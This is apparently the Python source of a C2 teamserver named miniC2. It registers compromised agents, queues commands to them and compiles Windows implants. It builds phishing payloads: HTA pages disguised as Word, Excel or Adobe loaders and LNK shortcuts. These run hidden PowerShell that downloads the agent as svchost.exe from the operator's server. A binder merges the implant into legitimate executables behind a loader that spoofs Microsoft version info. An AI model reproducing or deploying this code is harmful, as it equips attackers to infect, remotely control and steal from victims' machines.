"""
miniC2 Teamserver v5.0 - Standalone HTTPS C2 Server
No external dependencies required. Uses only Python stdlib.
"""
import os, re, json, uuid, ssl, subprocess, shutil, threading, time, base64, struct
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from functools import partial

HOST = "0.0.0.0"
PORT = 8443
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CERT_DIR = os.path.join(BASE_DIR, "certs")
CERT_FILE = os.path.join(CERT_DIR, "server.pem")
KEY_FILE = os.path.join(CERT_DIR, "server.key")
AGENT_SRC = os.path.join(BASE_DIR, "agent", "agent.cpp")
AGENT_BUILD_DIR = os.path.join(BASE_DIR, "agent", "builds")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

agents = {}
tasks = {}
results = {}
operator_tasks = []
tasks_lock = threading.Lock()
agent_notes = {}
notes_lock = threading.Lock()
bound_files = {}

import random, string
def _rand_str(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def _rand_int():
    return random.randint(1000, 999999)


# ============================================================
# SE / Office Payload Helpers
# ============================================================

def _get_agent_path():
    direct = os.path.join(BASE_DIR, "agent", "agent.exe")
    if os.path.isfile(direct) and os.path.getsize(direct) > 10000:
        return direct
    for root, dirs, files in os.walk(os.path.join(BASE_DIR, "agent", "builds")):
        for f in files:
            if f.endswith(".exe"):
                fp = os.path.join(root, f)
                if os.path.getsize(fp) > 10000:
                    return fp
    return direct


def _junk_xml_paragraphs(count=3):
    paragraphs = []
    junk_texts = [
        "The quarterly report has been updated with new figures from the regional office.",
        "Please review the attached documentation before the meeting on Friday.",
        "This document contains confidential information for internal use only.",
        "All financial data presented herein has been verified by the accounting department.",
        "The board of directors will review this proposal at the next scheduled session.",
        "Department heads are requested to submit their budget allocations by month end.",
        "The following pages contain detailed analysis of our current market position.",
        "Implementation of the new strategy will commence in the next fiscal quarter.",
        "Employee benefits package has been revised according to the latest guidelines.",
        "The executive summary outlines the key findings from our recent audit.",
        "Please ensure all referenced documents are attached when submitting your report.",
        "Performance metrics for the past six months indicate steady improvement across all KPIs.",
        "The project timeline has been adjusted to accommodate additional stakeholder requirements.",
        "Regulatory compliance updates have been incorporated into the revised policy document.",
        "Cross-functional collaboration will be essential for achieving our annual objectives.",
    ]
    for i in range(count):
        txt = random.choice(junk_texts) + " " + _rand_str(random.randint(8, 30))
        if i % 2 == 0:
            paragraphs.append(f'<w:p><w:r><w:t xml:space="preserve">{txt}</w:t></w:r></w:p>')
        else:
            paragraphs.append(f'<w:p><w:r><w:rPr><w:i/></w:rPr><w:t xml:space="preserve">{txt}</w:t></w:r></w:p>')
    return '\n    '.join(paragraphs)

def _junk_html_comments(count=5):
    return '\n'.join(f'<!-- {_rand_str(random.randint(20, 80))} -->' for _ in range(count))

def _junk_vba_vars(count=3):
    return '\n'.join(f'Dim _{_rand_str(random.randint(6, 16))}: _{_rand_str(random.randint(6, 16))} = {random.randint(0, 65535)}' for _ in range(count))


def _create_lnk_data(target_path, work_dir, arguments):
    def utf16le(s):
        return s.encode("utf-16-le") + b"\x00\x00"
    target = target_path.encode("ascii") + b"\x00"
    workdir = work_dir.encode("ascii") + b"\x00"
    args = (arguments or "").encode("ascii") + b"\x00"
    header = bytearray(76)
    header[0:4] = b"\x4c\x00\x00\x00"
    header[4:8] = struct.pack("<I", 0x00021401)
    header[8:12] = struct.pack("<I", 0x0000007C)
    header[12:16] = struct.pack("<I", 0x00000003)
    flags = 0x01 | 0x02 | 0x04 | 0x08 | 0x10 | 0x20 | 0x40 | 0x100 | 0x200 | 0x400 | 0x800
    struct.pack_into("<I", header, 20, flags)
    struct.pack_into("<I", header, 24, 0)
    struct.pack_into("<I", header, 28, 0)
    filetime = int((time.time() + 11644473600) * 10000000)
    struct.pack_into("<Q", header, 32, filetime)
    struct.pack_into("<Q", header, 40, filetime)
    struct.pack_into("<Q", header, 48, filetime)
    struct.pack_into("<I", header, 56, len(target))
    struct.pack_into("<I", header, 60, len(workdir))
    struct.pack_into("<I", header, 64, len(args))
    struct.pack_into("<I", header, 68, 0)
    struct.pack_into("<I", header, 72, 1)
    data = bytearray()
    data += header
    data += target
    data += workdir
    data += args
    return bytes(data)


def _create_hta_content(theme, dl_url):
    themes = {
        "word": {"title": "Microsoft Word", "subtitle": "Opening document...", "bg": "#2b579a"},
        "excel": {"title": "Microsoft Excel", "subtitle": "Opening workbook...", "bg": "#217346"},
        "adobe": {"title": "Adobe Acrobat", "subtitle": "Loading PDF document...", "bg": "#b30b00"},
    }
    t = themes.get(theme, themes["word"])
    junk_comments = _junk_html_comments(random.randint(4, 8))
    junk_id = _rand_str(12)
    junk_class = _rand_str(8)
    junk_var1 = _rand_str(10)
    junk_var2 = _rand_str(10)
    junk_var3 = _rand_str(10)
    junk_fn1 = _rand_str(10)
    dl_url_js = dl_url.replace("'", "\\'")
    return f'''<html>
<head><title>{t["title"]}</title>
{junk_comments}
<HTA:APPLICATION ID="{junk_id}" APPLICATIONNAME="{t["title"]}" BORDER="none" BORDERSTYLE="normal" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" SCROLL="no" WINDOWSTATE="normal" WIDTH="420" HEIGHT="280"/>
<style>
body{{margin:0;padding:0;background:{t["bg"]};color:#fff;font-family:'Segoe UI',Tahoma,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;overflow:hidden}}
.{junk_class}{{display:none}}
h2{{font-weight:400;font-size:16px;margin:0 0 8px}}p{{font-size:12px;opacity:.7;margin:0 0 30px}}
.pc{{width:280px;height:4px;background:rgba(255,255,255,.2);border-radius:2px;overflow:hidden}}
.bar{{height:100%;background:rgba(255,255,255,.9);width:0%;border-radius:2px;transition:width .3s}}
.st{{margin-top:15px;font-size:11px;opacity:.5}}
</style></head><body>
<div class="{junk_class}" id="{junk_var3}"></div>
<h2>{t["title"]}</h2><p>{t["subtitle"]}</p>
<div class="pc"><div class="bar" id="bar"></div></div>
<div class="st" id="status">Initializing...</div>
{junk_comments}
<script>
var p=0,s=document.getElementById("bar"),t=document.getElementById("status");
var dl="{dl_url_js}";
var {junk_var1}={random.randint(1000,9999)};
var {junk_var2}=new Array({random.randint(5,20)});
function {junk_fn1}(a,b){{return a+b}}
var st=[[10,"Reading metadata..."],[25,"Downloading update..."],[50,"Verifying..."],[70,"Installing..."],[85,"Configuring..."],[95,"Finalizing..."],[100,"Ready"]];
function tick(){{if(p<st[st.length-1][0]){{for(var i=0;i<st.length;i++){{if(p<st[i][0]){{p+=2;if(p>st[i][0])p=st[i][0];s.style.width=p+"%";t.innerText=st[i][1];break}}}}setTimeout(tick,80+Math.random()*120)}}else{{launch();setTimeout(function(){{window.close()}},600)}}}}
function launch(){{
  try{{
    var o=new ActiveXObject("WScript.Shell");
    var tmp=o.ExpandEnvironmentStrings("%TEMP%")+"\\\\svchost.exe";
    var ps='[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object Net.WebClient;$w.Headers.Add(\\"User-Agent\\",\\"Mozilla/5.0\\");$w.DownloadFile(\\"'+dl+'\\",\\""+tmp+"\\");Start-Process -WindowStyle Hidden -FilePath \\"'+tmp+'\\"';
    o.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\""+ps+"\\\"",0,false);
  }}catch(e){{}}
}}
{junk_comments}
tick();
</script></body></html>'''

class C2Handler(BaseHTTPRequestHandler):
    DASHBOARD_HTML = ""

    def log_message(self, fmt, *args):
        pass

    def _send_json(self, data, code=200):
        body = json.dumps(data).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(length) if length > 0 else b""

    def _read_json(self):
        data = self._read_body()
        if not data:
            return {}
        return json.loads(data.decode("utf-8", errors="replace"))

    def _send_file(self, path, download_name=None):
        if not os.path.isfile(path):
            self._send_json({"error": "not found"}, 404)
            return
        fname = download_name or os.path.basename(path)
        with open(path, "rb") as f:
            body = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, html):
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Filename")
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        qs = parse_qs(parsed.query)

        if path == "" or path == "/":
            self._send_html(self.DASHBOARD_HTML)
        elif path == "/api/agents":
            self._send_json(list(agents.values()))
        elif re.match(r"^/api/agents/([^/]+)$", path):
            aid = re.match(r"^/api/agents/([^/]+)$", path).group(1)
            self._send_json(agents.get(aid, {"error": "not found"}))
        elif path == "/api/results":
            self._send_json(sorted(results.values(), key=lambda x: x.get("timestamp", ""), reverse=True))
        elif re.match(r"^/api/results/([^/]+)$", path):
            aid = re.match(r"^/api/results/([^/]+)$", path).group(1)
            r = [v for v in results.values() if v.get("agent_id") == aid]
            self._send_json(sorted(r, key=lambda x: x.get("timestamp", ""), reverse=True))
        elif path == "/api/files":
            files = []
            if os.path.isdir(UPLOAD_DIR):
                for fn in sorted(os.listdir(UPLOAD_DIR), reverse=True):
                    fp = os.path.join(UPLOAD_DIR, fn)
                    if os.path.isfile(fp):
                        st = os.stat(fp)
                        files.append({"filename": fn, "size": st.st_size,
                            "modified": datetime.fromtimestamp(st.st_mtime).isoformat()})
            self._send_json(files)
        elif re.match(r"^/api/files/(.+)$", path):
            fn = re.match(r"^/api/files/(.+)$", path).group(1)
            import urllib.parse
            fn = urllib.parse.unquote(fn)
            fp = os.path.join(UPLOAD_DIR, os.path.basename(fn))
            if os.path.isfile(fp):
                self._send_file(fp)
            else:
                self._send_json({"error": "not found"}, 404)
        elif re.match(r"^/api/bind/download/(.+)$", path):
            build_id = re.match(r"^/api/bind/download/(.+)$", path).group(1)
            bp = bound_files.get(build_id)
            if bp and os.path.exists(bp):
                self._send_file(bp, os.path.basename(bp))
            else:
                self._send_json({"error": "not found"}, 404)
        elif re.match(r"^/api/agent/download$", path):
            ap = _get_agent_path()
            if os.path.isfile(ap):
                self._send_file(ap, "agent.exe")
            else:
                self._send_json({"error": "agent binary not found"}, 404)
        elif re.match(r"^/api/se/list$", path):
            files = []
            payload_dir = os.path.join(BASE_DIR, "payloads")
            if os.path.isdir(payload_dir):
                for fn in sorted(os.listdir(payload_dir), reverse=True):
                    fp = os.path.join(payload_dir, fn)
                    if os.path.isfile(fp):
                        st = os.stat(fp)
                        files.append({"filename": fn, "size": st.st_size,
                            "modified": datetime.fromtimestamp(st.st_mtime).isoformat()})
            self._send_json(files)
        elif re.match(r"^/api/se/download/(.+)$", path):
            fname = re.match(r"^/api/se/download/(.+)$", path).group(1)
            import urllib.parse
            fname = urllib.parse.unquote(fname)
            payload_dir = os.path.join(BASE_DIR, "payloads")
            fpath = os.path.join(payload_dir, os.path.basename(fname))
            if os.path.isfile(fpath):
                self._send_file(fpath, os.path.basename(fname))
            else:
                self._send_json({"error": "not found"}, 404)
        elif re.match(r"^/api/phish/download/(.+)$", path):
            fname = re.match(r"^/api/phish/download/(.+)$", path).group(1)
            import urllib.parse
            fname = urllib.parse.unquote(fname)
            payload_dir = os.path.join(BASE_DIR, "payloads")
            fpath = os.path.join(payload_dir, os.path.basename(fname))
            if os.path.isfile(fpath):
                self._send_file(fpath, os.path.basename(fname))
            else:
                self._send_json({"error": "not found"}, 404)
        elif re.match(r"^/api/notes/([^/]+)$", path):
            aid = re.match(r"^/api/notes/([^/]+)$", path).group(1)
            with notes_lock:
                self._send_json({"notes": agent_notes.get(aid, [])})
        else:
            self._send_json({"error": "not found"}, 404)

    def do_DELETE(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        if re.match(r"^/api/files/(.+)$", path):
            fn = re.match(r"^/api/files/(.+)$", path).group(1)
            import urllib.parse
            fn = urllib.parse.unquote(fn)
            fp = os.path.join(UPLOAD_DIR, os.path.basename(fn))
            if os.path.isfile(fp):
                os.remove(fp)
                self._send_json({"status": "ok"})
            else:
                self._send_json({"error": "not found"}, 404)
        else:
            self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        qs = parse_qs(parsed.query)
        content_type = self.headers.get("Content-Type", "")

        if path == "/checkin":
            data = self._read_json()
            aid = data.get("agent_id", "")
            if not aid:
                aid = str(uuid.uuid4())[:8]
                data["agent_id"] = aid
            if aid in agents:
                a = agents[aid]
                a["last_seen"] = datetime.now().isoformat()
                a["online"] = True
                a["status"] = "online"
                a["missed_checkins"] = 0
                a["total_checkins"] = a.get("total_checkins", 0) + 1
                a["pid"] = data.get("pid", a.get("pid"))
                a["process"] = data.get("process", a.get("process"))
                try:
                    first = datetime.fromisoformat(a["first_seen"])
                    a["uptime_sec"] = int((datetime.now() - first).total_seconds())
                except: pass
            else:
                agents[aid] = {
                    "id": aid, "hostname": data.get("hostname", "unknown"),
                    "username": data.get("username", "unknown"),
                    "external_ip": self.client_address[0], "os": data.get("os", "unknown"),
                    "arch": data.get("arch", "unknown"), "pid": data.get("pid", 0),
                    "process": data.get("process", "unknown"), "sleep": data.get("sleep", 10),
                    "first_seen": datetime.now().isoformat(),
                    "last_seen": datetime.now().isoformat(), "online": True,
                    "status": "online", "uptime_sec": 0, "missed_checkins": 0,
                    "total_checkins": 0, "total_results": 0,
                }
            with tasks_lock:
                pending = [t for t in operator_tasks if t.get("target_agent") == aid]
                operator_tasks[:] = [t for t in operator_tasks if t.get("target_agent") != aid]
            for t in pending:
                tasks[t["task_id"]] = t
            self._send_json({"status": "ok", "agent_id": aid, "tasks": pending})

        elif path == "/result":
            data = self._read_json()
            task_id = data.get("task_id")
            agent_id = data.get("agent_id")
            if not task_id:
                self._send_json({"status": "error"}, 400)
                return
            cmd_name = ""
            with tasks_lock:
                for t in operator_tasks:
                    if t.get("task_id") == task_id:
                        cmd_name = t.get("command", "")
                        t["status"] = "done"
                        break
            results[task_id] = {
                "task_id": task_id, "agent_id": agent_id,
                "output": data.get("output", ""), "success": data.get("success", True),
                "command": cmd_name,
                "timestamp": datetime.now().isoformat()
            }
            if agent_id in agents:
                a = agents[agent_id]
                a["last_seen"] = datetime.now().isoformat()
                a["online"] = True
                a["status"] = "online"
                a["missed_checkins"] = 0
                a["total_results"] = a.get("total_results", 0) + 1
            self._send_json({"status": "ok"})

        elif path == "/heartbeat":
            data = self._read_json()
            aid = data.get("agent_id")
            if aid and aid in agents:
                a = agents[aid]
                a["last_seen"] = datetime.now().isoformat()
                a["online"] = True
                a["status"] = "online"
                a["missed_checkins"] = 0
            self._send_json({"status": "ok"})

        elif path == "/api/upload":
            filename = self.headers.get("X-Filename", "unknown.bin")
            data = self._read_body()
            if not data:
                self._send_json({"error": "no data"}, 400)
                return
            file_id = str(uuid.uuid4())[:8]
            ext = os.path.splitext(filename)[1] or ".bin"
            save_name = f"{file_id}{ext}"
            with open(os.path.join(UPLOAD_DIR, save_name), "wb") as f:
                f.write(data)
            self._send_json({"status": "ok", "file_id": file_id, "filename": save_name, "original": filename, "size": len(data)})

        elif path == "/api/task":
            data = self._read_json()
            target = data.get("target_agent")
            command = data.get("command")
            args = data.get("args", {})
            if not target or not command:
                self._send_json({"error": "target and command required"}, 400)
                return
            if target not in agents:
                self._send_json({"error": "agent not found"}, 404)
                return
            task_id = str(uuid.uuid4())[:8]
            task = {"task_id": task_id, "command": command, "args": args,
                    "target_agent": target, "created": datetime.now().isoformat(), "status": "pending"}
            with tasks_lock:
                operator_tasks.append(task)
            self._send_json({"status": "ok", "task_id": task_id})

        elif re.match(r"^/api/kill/([^/]+)$", path):
            aid = re.match(r"^/api/kill/([^/]+)$", path).group(1)
            if aid not in agents:
                self._send_json({"error": "not found"}, 404)
                return
            task_id = str(uuid.uuid4())[:8]
            with tasks_lock:
                operator_tasks.append({"task_id": task_id, "command": "kill", "args": {},
                    "target_agent": aid, "created": datetime.now().isoformat(), "status": "pending"})
            self._send_json({"status": "ok", "task_id": task_id})

        elif re.match(r"^/api/agents/([^/]+)/remove$", path):
            aid = re.match(r"^/api/agents/([^/]+)/remove$", path).group(1)
            if aid not in agents:
                self._send_json({"error": "not found"}, 404)
                return
            del agents[aid]
            with tasks_lock:
                operator_tasks[:] = [t for t in operator_tasks if t.get("target_agent") != aid]
            tasks.pop(aid, None)
            results.pop(aid, None)
            self._send_json({"status": "ok"})

        elif path == "/api/agents/purge":
            dead = [aid for aid, a in agents.items() if a.get("status") in ("offline", "dead")]
            for aid in dead:
                del agents[aid]
                with tasks_lock:
                    operator_tasks[:] = [t for t in operator_tasks if t.get("target_agent") != aid]
            self._send_json({"status": "ok", "removed": len(dead)})

        elif path == "/api/clear":
            agents.clear()
            tasks.clear()
            results.clear()
            with tasks_lock:
                operator_tasks.clear()
            self._send_json({"status": "ok"})

        elif path == "/api/build":
            data = self._read_json() or {}
            c2_host = data.get("c2_host", "127.0.0.1")
            c2_port = int(data.get("c2_port", 8443))
            sleep_sec = int(data.get("sleep", 10))
            jitter = int(data.get("jitter", 30))
            try:
                with open(AGENT_SRC, "r", encoding="utf-8", errors="replace") as f:
                    src = f.read()
                src = re.sub(r'#define C2_HOST\s+L"[^"]*"', f'#define C2_HOST        L"{c2_host}"', src)
                src = re.sub(r'#define C2_PORT\s+\d+', f'#define C2_PORT        {c2_port}', src)
                src = re.sub(r'#define SLEEP_SECONDS\s+\d+', f'#define SLEEP_SECONDS  {sleep_sec}', src)
                src = re.sub(r'#define SLEEP_JITTER\s+\d+', f'#define SLEEP_JITTER   {jitter}', src)
                os.makedirs(AGENT_BUILD_DIR, exist_ok=True)
                build_id = str(uuid.uuid4())[:8]
                build_dir = os.path.join(AGENT_BUILD_DIR, build_id)
                os.makedirs(build_dir, exist_ok=True)
                build_src = os.path.join(build_dir, "agent.cpp")
                build_exe = os.path.join(build_dir, "agent.exe")
                with open(build_src, "w") as f:
                    f.write(src)
                result = subprocess.run(
                    ["g++", "-o", build_exe, build_src,
                     "-lwinhttp", "-ladvapi32", "-luser32", "-lgdi32",
                     "-lole32", "-loleaut32", "-luuid", "-lrpcrt4", "-lws2_32",
                     "-static", "-O2", "-w", "-fpermissive", "-mwindows"],
                    capture_output=True, text=True, timeout=60)
                if result.returncode != 0 or not os.path.exists(build_exe):
                    self._send_json({"error": "build failed", "stderr": result.stderr}, 500)
                    return
                self._send_file(build_exe, f"miniC2_{build_id}.exe")
            except subprocess.TimeoutExpired:
                self._send_json({"error": "build timeout"}, 500)
            except Exception as e:
                self._send_json({"error": str(e)}, 500)

        elif path == "/api/bind":
            try:
                agent_path = _get_agent_path()
                if not os.path.exists(agent_path):
                    self._send_json({"error": "agent.exe not found, build first"}, 400)
                    return
                if "multipart/form-data" not in content_type:
                    self._send_json({"error": "multipart form required"}, 400)
                    return
                boundary = content_type.split("boundary=")[-1].encode()
                body = self._read_body()
                parts = body.split(b"--" + boundary)
                target_data = None
                target_name = "target.exe"
                form_data = {}
                for part in parts:
                    if b"Content-Disposition" not in part:
                        continue
                    header_end = part.find(b"\r\n\r\n")
                    if header_end == -1:
                        continue
                    headers_raw = part[:header_end].decode("utf-8", errors="replace")
                    part_body = part[header_end+4:]
                    if part_body.endswith(b"\r\n"):
                        part_body = part_body[:-2]
                    name_match = re.search(r'name="([^"]+)"', headers_raw)
                    filename_match = re.search(r'filename="([^"]+)"', headers_raw)
                    if name_match:
                        field = name_match.group(1)
                        if filename_match:
                            target_name = filename_match.group(1)
                            target_data = part_body
                        else:
                            form_data[field] = part_body.decode("utf-8", errors="replace")
                if not target_data:
                    self._send_json({"error": "target exe file required"}, 400)
                    return
                c2_host = form_data.get("c2_host", "127.0.0.1")
                c2_port = int(form_data.get("c2_port", 8443))
                sleep_sec = int(form_data.get("sleep", 10))
                jitter = int(form_data.get("jitter", 30))
                with open(AGENT_SRC, "r", encoding="utf-8", errors="replace") as f:
                    src = f.read()
                src = re.sub(r'#define C2_HOST\s+L"[^"]*"', f'#define C2_HOST        L"{c2_host}"', src)
                src = re.sub(r'#define C2_PORT\s+\d+', f'#define C2_PORT        {c2_port}', src)
                src = re.sub(r'#define SLEEP_SECONDS\s+\d+', f'#define SLEEP_SECONDS  {sleep_sec}', src)
                src = re.sub(r'#define SLEEP_JITTER\s+\d+', f'#define SLEEP_JITTER   {jitter}', src)
                os.makedirs(AGENT_BUILD_DIR, exist_ok=True)
                build_id = str(uuid.uuid4())[:8]
                build_dir = os.path.join(AGENT_BUILD_DIR, build_id)
                os.makedirs(build_dir, exist_ok=True)
                build_src = os.path.join(build_dir, "agent.cpp")
                build_exe = os.path.join(build_dir, "agent.exe")
                with open(build_src, "w") as f:
                    f.write(src)
                result = subprocess.run(
                    ["g++", "-o", build_exe, build_src,
                     "-lwinhttp", "-ladvapi32", "-luser32", "-lgdi32",
                     "-lole32", "-loleaut32", "-luuid", "-lrpcrt4", "-lws2_32",
                     "-static", "-O2", "-w", "-fpermissive", "-mwindows"],
                    capture_output=True, text=True, timeout=60)
                if result.returncode != 0 or not os.path.exists(build_exe):
                    self._send_json({"error": "agent build failed", "stderr": result.stderr}, 500)
                    return
                with open(agent_path, "rb") as f:
                    agent_data = f.read()
                with open(agent_path, "rb") as f:
                    agent_data = f.read()
                stub_src = os.path.join(build_dir, "loader.cpp")
                stub_exe = os.path.join(build_dir, "bind.exe")
                stub_code = r'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
int main() {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    FILE *f = fopen(exe_path, "rb");
    if (!f) return 1;
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    if (file_size < 8) { fclose(f); return 1; }
    fseek(f, file_size - 8, SEEK_SET);
    unsigned int stub_size = 0, target_size = 0;
    fread(&stub_size, 4, 1, f);
    fread(&target_size, 4, 1, f);
    if (stub_size == 0 || stub_size >= (unsigned int)file_size) { fclose(f); return 1; }
    unsigned int agent_size = (unsigned int)file_size - stub_size - target_size - 8;
    fseek(f, stub_size, SEEK_SET);
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char target_path[MAX_PATH];
    char agent_path_out[MAX_PATH];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    if (target_size > 0) {
        char *target_buf = (char*)malloc(target_size);
        if (target_buf) {
            fread(target_buf, 1, target_size, f);
            sprintf_s(target_path, "%starget_host.exe", tmp);
            FILE *tf = fopen(target_path, "wb");
            if (tf) { fwrite(target_buf, 1, target_size, tf); fclose(tf); }
            free(target_buf);
            ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            CreateProcessA(target_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        }
    }
    if (agent_size > 0) {
        char *agent_buf = (char*)malloc(agent_size);
        if (agent_buf) {
            fread(agent_buf, 1, agent_size, f);
            sprintf_s(agent_path_out, "%sminic2_svc.exe", tmp);
            FILE *af = fopen(agent_path_out, "wb");
            if (af) { fwrite(agent_buf, 1, agent_size, af); fclose(af); }
            free(agent_buf);
            ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            CreateProcessA(agent_path_out, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        }
    }
    fclose(f);
    return 0;
}
'''
                stub_rc_content = r'''
#include <winver.h>
1 RT_MANIFEST "loader.manifest"
VS_VERSION_INFO VERSIONINFO
  FILEVERSION 10,0,26200,1
  PRODUCTVERSION 10,0,26200,1
  FILEFLAGSMASK 0x3fL
  FILEFLAGS 0x0L
  FILEOS 0x40004L
  FILETYPE 0x1L
  FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName", "Microsoft Corporation"
            VALUE "FileDescription", "Microsoft Windows Operating System"
            VALUE "FileVersion", "10.0.26200.1"
            VALUE "InternalName", "host"
            VALUE "OriginalFilename", "host.exe"
            VALUE "ProductName", "Microsoft Windows Operating System"
            VALUE "ProductVersion", "10.0.26200.1"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END
'''
                stub_manifest = r'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity version="1.0.0.0" processorArchitecture="amd64" name="Microsoft.Windows.Common-Controls" type="win32"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
    </windowsSettings>
  </application>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
      <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
      <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>
    </application>
  </compatibility>
</assembly>
'''
                stub_manifest_path = os.path.join(build_dir, "loader.manifest")
                stub_rc_path = os.path.join(build_dir, "loader.rc")
                stub_res_path = os.path.join(build_dir, "loader.o")
                with open(stub_manifest_path, "w") as f:
                    f.write(stub_manifest)
                with open(stub_rc_path, "w") as f:
                    f.write(stub_rc_content)
                with open(stub_src, "w") as f:
                    f.write(stub_code)
                windres_result = subprocess.run(
                    ["windres", stub_rc_path, "-o", stub_res_path],
                    capture_output=True, text=True, timeout=15)
                if windres_result.returncode != 0:
                    result = subprocess.run(
                        ["g++", "-o", stub_exe, stub_src, "-ladvapi32", "-static", "-O2", "-w", "-mwindows"],
                        capture_output=True, text=True, timeout=30)
                else:
                    result = subprocess.run(
                        ["g++", "-o", stub_exe, stub_src, stub_res_path, "-ladvapi32", "-static", "-O2", "-w", "-mwindows"],
                        capture_output=True, text=True, timeout=30)
                if result.returncode != 0 or not os.path.exists(stub_exe):
                    self._send_json({"error": "loader build failed", "stderr": result.stderr}, 500)
                    return
                with open(stub_exe, "rb") as f:
                    stub_data = f.read()
                stub_size = len(stub_data)
                bound = bytearray()
                bound += stub_data
                bound += target_data
                bound += agent_data
                bound += struct.pack("<I", stub_size)
                bound += struct.pack("<I", len(target_data))
                out_name = os.path.splitext(target_name)[0] + "_bound.exe"
                server_url = f"https://{self.headers.get('Host', f'127.0.0.1:{PORT}')}"
                dl_url = f"{server_url}/api/bind/download/{build_id}"
                ps_download = f"irm {dl_url} -OutFile $env:TEMP\\{out_name}; Unblock-File $env:TEMP\\{out_name}; Start-Process $env:TEMP\\{out_name}"
                bound_path = os.path.join(build_dir, out_name)
                with open(bound_path, "wb") as f:
                    f.write(bytes(bound))
                bound_files[build_id] = bound_path
                self._send_json({
                    "ok": True, "filename": out_name, "dl_url": dl_url,
                    "ps_download": ps_download
                })
            except subprocess.TimeoutExpired:
                self._send_json({"error": "bind build timeout"}, 500)
            except Exception as e:
                self._send_json({"error": str(e)}, 500)

        elif re.match(r"^/api/notes/([^/]+)$", path):
            aid = re.match(r"^/api/notes/([^/]+)$", path).group(1)
            data = self._read_json() or {}
            action = data.get("action", "add")
            with notes_lock:
                if aid not in agent_notes:
                    agent_notes[aid] = []
                if action == "add":
                    content = data.get("content", "").strip()
                    if content:
                        note = {
                            "id": str(uuid.uuid4())[:8],
                            "content": content,
                            "timestamp": datetime.now().isoformat()
                        }
                        agent_notes[aid].append(note)
                elif action == "delete":
                    note_id = data.get("note_id", "")
                    agent_notes[aid] = [n for n in agent_notes[aid] if n["id"] != note_id]
            self._send_json({"status": "ok"})

        elif path == "/api/se/generate":
            data = self._read_json() or {}
            payload_type = data.get("type", "hta")
            name = data.get("name", "Document").replace("/", "_").replace("\\", "_")[:60]
            theme = data.get("theme", "word")
            c2_url = data.get("url", "https://127.0.0.1:8443").rstrip("/")
            dl_url = f"{c2_url}/api/agent/download"
            payload_dir = os.path.join(BASE_DIR, "payloads")
            os.makedirs(payload_dir, exist_ok=True)
            try:
                if payload_type == "lnk":
                    ps_cmd = f'[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object Net.WebClient;$w.Headers.Add("User-Agent","Mozilla/5.0");$t="$env:TEMP\\svchost.exe";$w.DownloadFile("{dl_url}",$t);Start-Process -WindowStyle Hidden -FilePath $t'
